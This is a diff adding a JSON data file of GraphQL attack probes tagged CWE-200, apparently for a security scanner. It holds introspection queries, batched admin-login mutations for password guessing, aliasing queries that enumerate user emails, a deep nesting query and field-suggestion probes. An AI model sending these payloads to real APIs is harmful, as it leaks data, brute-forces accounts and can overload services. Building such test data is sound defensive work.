@@ -1,0 +1,15 @@
+{
+  "variants": {
+    "introspection": ["{__schema{types{name fields{name}}}}", "{__schema{queryType{name fields{name type{name kind ofType{name}}}}}}", "{__type(name:\"User\"){fields{name type{name kind ofType{name}}}}}"],
+    "batching": [{"query":"{user(id:1){name email}}", "query":"{user(id:2){name email}}"}, {"query":"mutation{login(user:\"admin\",pass:\"x\"){token}}", "query":"mutation{login(user:\"admin\",pass:\"y\"){token}}"}],
+    "aliasing": ["{a:user(id:1){email} b:user(id:2){email} c:user(id:3){email}}"],
+    "depth": ["{user{friends{user{friends{user{friends{user{friends{user{friends{user{friends{user{friends{user{name}}}}}}}}}}}}}}}}}"],
+    "suggestions": ["{usr{name}}", "{users{nme}}", "{userInfo{nme}}"]
+  },
+  "payloads": ["{__schema{types{name fields{name}}}}", "{__type(name:\"User\"){fields{name}}}"],
+  "markers": ["__schema", "queryType", "mutationType", "subscriptionType", "types", "fields", "inputFields", "interfaces", "enumValues", "possibleTypes"],
+  "metadata": {
+    "cwe": "CWE-200",
+    "technique": "GraphQL attacks"
+  }
+}
